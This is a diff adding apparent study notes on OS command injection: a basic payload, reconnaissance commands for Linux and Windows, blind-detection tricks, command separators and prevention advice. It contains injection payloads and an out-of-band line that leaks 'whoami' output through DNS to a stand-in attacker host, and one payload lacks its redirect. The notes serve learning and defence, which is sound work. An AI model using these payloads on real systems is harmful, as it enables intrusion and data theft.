@@ -1,0 +1,61 @@
+COMMAND INJECTION
+
+* This is the vulnerability where an attacker may provide OS commands to the server.
+
+
+Basic Payload Example: & echo Hello World & 
+
+
+USEFULL COMMANDS FOR EXPLOTATION
+
+
+Purpose                   | Linux         | Windows
+----------------------------------------------------------------
+Name of the current user  | whoami        | whoami
+OS                        | uname -a      | ver
+Network Config            | ifconfig      | ipconfig /all
+Network Connections       | netstat -an   | netstat -an
+Current Processes         | ps -ef        | tasklist
+
+
+BLIND OS COMMAND INJECTION VULNERABILITIES
+
+
+-> We can detect with time delays
+
+& ping -c 10 localhost &
+
+This will caluse 10 seconds of delay because it will send 10 ICMP packets seperated by 1 sec
+
+-> Another way input detection
+
+& ps -ef ./output.txt &
+
+But in this case, we need to find a way to read the context of the output.txt. So, this option is very good if there is also a path traversal vulnerability.
+
+-> OOB techniques can be used.
+
+& nslookup  `whoami`.hackerswebsite.com &
+
+This will cause a DNS look-up for hackers website and contain the result of "whoami" command.
+
+OTHER COMMAND SEPERATORS
+
+-> &
+-> && 
+-> | 
+-> ||
+-> ; ( Only on Unix-based systems )
+
+Below can be used to perform inline execution of an injected  command within the original command
+-> `
+-> $( 
+
+HOW TO PREVENT OS COMMAND INJECTION ATTACKS?
+
+-> The most effective way is to never call out OS commands from application layer code
+-> Validate against a WHITELIST of permitted values
+-> Validate input format i.e. Input is an integer or Input contains only alphanumeric characters.
+
+
+
